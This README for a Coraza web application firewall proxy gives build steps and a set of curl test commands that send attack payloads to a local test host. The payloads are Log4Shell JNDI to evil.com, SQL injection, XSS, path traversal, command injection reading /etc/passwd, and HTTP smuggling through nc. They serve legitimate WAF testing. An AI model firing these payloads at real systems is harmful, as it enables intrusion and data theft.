# CORAZA PROXY

[WIKI](https://deepwiki.com/alexperezortuno/go-coraza/1-overview)

### Compile

```bash
go build -o ./dist/coraza-proxy main.go
```

```bash
docker build --no-cache -t wafsec:local .
```

Add `127.0.0.1 waf.test.local` to `/etc/hosts`
Add `127.0.0.1 api.test.local` to `/etc/hosts`

### Dependencies

- [coraza-waf](https://github.com/corazawaf/coraza)

```bash
git clone --depth 1 https://github.com/coreruleset/coreruleset
```

### Testing

#### Log4Shell

```bash
curl --request POST "http://waf.test.local:8081" \
     -H "Host: waf.test.local" \
     -H "x-crs-paranoia-level: 4" \
     -H "x-format-output: txt-matched-rules" \
     -H "x-backend: coraza" \
     -H "x-crs-version: 3.4.0-dev-log4j" \
     -H 'User-Agent: ${jndi:ldap://evil.com}' \
     https://sandbox.coreruleset.org
```

### SQL Injection (simple)

```bash
curl --location --request GET "http://waf.test.local:8081/" \
  --header 'Host: waf.test.local' \
  --data-urlencode "id=1' OR '1'='1"
```

### SQLi (UNION)

```bash
curl --location --request GET "http://waf.test.local:8081/" \
  --header 'Host: waf.test.local' \
  --data-urlencode "q=1 UNION SELECT 1,2,3--"
```

### SQLi boolean-based

```bash
curl --location --request GET "http://waf.test.local:8081/" \
  --header 'Host: waf.test.local' \
  --data-urlencode "q=1 AND 1=1"
```

### XSS clásico

```bash
curl --location --request GET "http://waf.test.local:8081/" \
  --header 'Host: waf.test.local' \
  --data-urlencode "x=<script>alert(1)</script>"
```

### XSS avanzado

```bash
curl --location --request GET "http://waf.test.local:8081/" \
  --header 'Host: waf.test.local' \
  --data-urlencode "q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E"
```

### LFI — Local File Inclusion

```bash
curl --location --request GET "http://waf.test.local:8081/" \
  --header 'Host: waf.test.local' \
  --data-urlencode "file=../../etc/passwd"
```

### RCE — Remote Command Injection

```bash
curl --location --request GET "http://waf.test.local:8081/" \
  --header 'Host: waf.test.local' \
  --data-urlencode "cmd=;ls -la"
```

### Protocol Attack

```bash
curl --location --request GET "http://waf.test.local:8081/" \
  --header 'Host: '
```

### HTTP Smuggling

```bash
printf "GET / HTTP/1.1\r\nHost: waf.test.local\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n" | nc waf.test.local 80
```

### Request con UTF-8 inválido (CRS debería bloquearlo)

```bash
curl --location --request GET "http://waf.test.local:8081/" \
  --header 'Host: waf.test.local' \
  --data-urlencode "q=%C0"
```

### A1 — Inyecciones múltiples

```bash
curl --location --request GET "http://waf.test.local:8081/" \
  --header 'Host: waf.test.local' \
  --data-urlencode "debug=$(cat /etc/passwd)"
```

```bash
curl --location --request GET "http://waf.test.local:8081/" \
  --header 'Host: waf.test.local' \
  --data-urlencode "calc=1|sleep 5"
```

### A3 — Exposición de datos (API con JSON malicioso)

```bash
curl -v -X POST "http://waf.test.local:8081" \
  -H "Content-Type: application/json" \
  -d '{"name":"<script>alert(1)</script>"}'
```

### A6 — Misconfiguration Attack

```bash
curl -v -X POST "http://waf.test.local:8081" \
  -H "X-Api-Version: <script>" "http://waf.test.local:8081"
```
